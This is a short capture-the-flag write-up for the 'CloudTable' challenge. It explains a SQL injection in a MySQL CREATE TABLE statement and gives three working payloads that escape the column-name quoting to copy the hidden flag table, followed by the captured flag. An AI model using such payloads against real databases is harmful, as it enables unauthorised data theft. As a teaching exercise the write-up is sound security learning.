# CloudTable

## Description

CloudTable

Shou made a free MySQL table creator. Try it out and hack it!  Note: Flag is in flag table of cloudtable database.

## Solution

This challenge features SQL injection in a CREATE TABLE clause. I have to admit I spent way longer than I should have on it because I forgot to add the database prefix to the statement. Also, I was mostly trying the table name "flags" until the note was added to the challenge description.

The original statement is:

```sql
CREATE TABLE `cloudtable`.`{new table name}`(`{USER INPUT}` TYPE);
```

My approach was just to use one of the techniques to clone tables with additional fields. Here are a few working attacks that copy the flag table into the new table:

> hi\` TEXT) AS SELECT * FROM cloudtable.flag;#
> hi\` TEXT) TABLE cloudtable.flag;#
> hi\` TEXT) SELECT * FROM cloudtable.flag;#

Flag: `we{1cf8b0f2-7659-4277-b1be-8b50b1d1e046@Sq1_Injection_By_Cr3ate}`

I also tried to use check constraints but could not get the server to accept them :(
